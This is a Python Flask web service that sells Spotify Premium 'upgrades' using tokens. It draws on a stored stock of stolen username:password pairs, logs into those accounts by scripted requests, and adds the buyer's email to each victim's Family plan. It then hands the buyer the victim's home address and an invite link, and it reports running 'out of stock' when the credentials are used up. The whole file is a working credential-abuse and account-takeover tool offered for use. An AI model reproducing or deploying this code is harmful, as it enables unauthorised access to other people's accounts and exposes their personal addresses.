PERMANENT_TOKEN = "SomeRandomToken"

import os
import glob
from flask import Flask, request, render_template, jsonify
import random
import requests as c
import asyncio
import json
import requests
import sys
import traceback

app = Flask(__name__, static_folder='public', template_folder='views', static_url_path='')
COUNTRIES = []
TokenFile = "tokens.txt"

def grab_accounts(key, newData):
    files = glob.glob("Accounts/*.txt")
    for fname in files:
        f = open(fname, 'r')
        country = fname.split('.')[0].split('/')[1]
        if country not in COUNTRIES:
            COUNTRIES.append(country)
        if country not in newData:
            newData[country] = []
        for line in f:
            clean = line.split('\n')
            newData[country].append(clean[0])
        f.close()

    #key GRAB
    f = open(TokenFile, 'r')
    for line in f:
        clean = line.split('\n')
        key.append(clean[0])
    f.close()

def replace_stock(key, newData={}):
    print(newData)
    files = glob.glob("Accounts/*.txt")
    for fname in files:
        os.remove(fname)
        f = open(fname, 'a')
        country = fname.split('.')[0].split('/')[1]
        if country not in COUNTRIES:
            COUNTRIES.append(country)
        for ELEM in newData[country]:
            f.write(ELEM + '\n')
        f.close()
    #Replace Key Accounts
    os.remove(TokenFile)
    f = open(TokenFile, 'a')
    for ELEM in key:
        f.write(ELEM + '\n')
    f.close()

def log(email, country, token, result):
    with open("logs/" + result + ".txt", "a+") as f:
        writable = "\n\n-----------\nUser Email: " + email + "\nCountry: " + country + "\nToken: " + token + "\n-----------"
        f.write(writable)

def gen(email, country, t):
    key = []
    data = {}
    for c in COUNTRIES:
        data[c] = []
    grab_accounts(key, data)

    if t not in key and t != PERMANENT_TOKEN:
        return {'response': "token"}

    if country not in COUNTRIES:
        return {'response': "system"}

    if t in key:
        key.remove(t)

    result = {'response': "none"}
    while result["response"] != True:
        if len(data[country]) == 0:
            replace_stock(key, data)
            return {'response': "empty" } # out of stock
            break
        account = data[country][0]
        del data[country][0]
        combo = account.split(':')
        USER = combo[0]
        PASS= combo[1]
        try:
            with requests.Session() as c:
                url = 'https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F'
                headers = {'Accept':'*/*', 'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1'  }
                page = c.get(url, headers= headers)

                CSRF = page.cookies['csrf_token']
                headers = {'Accept':'*/*', 'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1', 'Referer': 'https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fus%2Fgooglehome%2Fregister%2F&_locale=en-US'  }
                url = 'https://accounts.spotify.com/api/login'
                login_data = {'remember':'true' , 'username':USER ,  'password':PASS , 'csrf_token': CSRF }
                cookies = dict(__bon='MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx')
                login = c.post(url, headers = headers, data= login_data, cookies = cookies )
                if '{"displayName":"'in login.text:
                    url='https://www.spotify.com/us/account/overview/'
                    capture = c.get(url, headers= headers)
                    csr = capture.headers['X-Csrf-Token']
                    url = 'https://www.spotify.com/us/family/api/master-invite-by-email/'
                    headers = {'Accept':'*/*', 'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1', 'x-csrf-token': csr}
                    login_data = {"firstName":"thomas","lastName":"Payne","email":email}
                    invite = c.post(url, headers=headers, json= login_data)
                    if 'true' in invite.text:
                        url = 'https://www.spotify.com/us/family/api/get-family-plan/'
                        address = c.post(url, headers=headers, json= login_data)
                        address = json.loads(address.text)
                        link = str(address['data']['invites'][0]['redeemLink'])
                        address = json.dumps(address['data']['master']['address'])
                        data[country].append(combo[0]+':'+combo[1])
                        result = {'response': True, 'address': address, 'link': link}

                        break
                    if 'message":"Invite limit reached' in invite.text:
                        result = {'response': None}

                    else:
                        data[country].append(combo[0]+':'+combo[1])
                        result = {'response': None}

                if '{"error":"errorInvalidCredentials"}' in login.text:
                    result = {'response': None}

        except:
            pass

    replace_stock(key, data)
    return result


@app.route('/api/countries')
def countries():
    data = {}
    key = []
    for c in COUNTRIES:
        data[c] = []
    grab_accounts(key, data)
    all = []
    for c in COUNTRIES:
        all.append({"count": len(data[c]), "country": c})
    return jsonify(all)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/send')
def sendreq():
    t = request.args.get('token')
    country = request.args.get('country')
    email = request.args.get('email')

    if not t or not country or not email:
        return jsonify({
          "result": "Error",
          "description": "Please fill in all fields."
        })

    a = {}
    details = gen(email, country, t)
    resp = details["response"]
    if resp is True:
        address = details["address"]
        link = details["link"]
        log('Success', email, country, t)
        return jsonify({
          "result": "Success",
          "description": "You have been upgraded to spotify premium. When it prompts you to enter your address, use this: <br><code>" + address + "</code>. Click <a href='" + link + "'>here</a> to accept your invite"
        })
    elif resp is 'token':
        log(email, country, t, 'Invalid token')
        return jsonify({
          "result": "Error",
          "description": "The token you provided is invalid."
        })
    elif resp is 'system':
        log(email, country, t, 'System Error')
        return jsonify({
          "result": "Error",
          "description": "There was an error while processing your request. Please try again later or contact us."
        })
    elif resp is 'empty':
        log(email, country, t, 'List empty')
        return jsonify({
          "result": "Error",
          "description": "Unfortunately, we're out of stock for that country. Please choose another one or wait for us to restock."
        })
    else:
        print(resp)
        log(email, country, t, 'Unknown error')
        return jsonify({
          "result": "Error",
          "description": "There was an error while processing your request. Please try again later or contact us."
        })

if __name__ == '__main__':
    app.run(port=80)
